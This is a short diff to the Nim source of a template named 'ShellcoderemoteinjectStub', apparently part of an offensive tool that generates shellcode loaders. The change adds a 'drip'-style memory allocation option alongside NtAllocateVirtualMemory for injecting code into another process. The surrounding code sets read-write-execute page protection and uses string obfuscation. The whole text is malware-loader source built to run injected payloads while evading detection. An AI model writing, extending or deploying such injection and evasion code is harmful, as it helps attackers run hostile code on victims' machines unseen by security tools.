@@ -304,10 +304,17 @@ let ShellcoderemoteinjectStub * = """
                 protectionValue = PAGE_READWRITE
             when defined(RWX):
                 protectionValue = PAGE_EXECUTE_READWRITE
-
-            status = NtAllocateVirtualMemory(tProcess, &ds, 0, &sc_size,MEM_COMMIT,protectionValue)
-            when defined(verbose):
-                echo obf("[*] NtAllocateVirtualMemory: "), status
+            
+            when defined(AllocateDripStyle):
+                var result: bool = DripAllocate(tProcess, &ds, cast[SIZE_T](friendlycode.len), protectionValue)
+                if result == false:
+                    echo "Fail"
+                    quit(1)
+            else:
+                status = NtAllocateVirtualMemory(tProcess, &ds, 0, &sc_size,MEM_COMMIT,protectionValue)
+                when defined(verbose):
+                    echo obf("[*] NtAllocateVirtualMemory: "), status
+            
             var bytesWritten: SIZE_T
             
             when defined(JmpEntry):
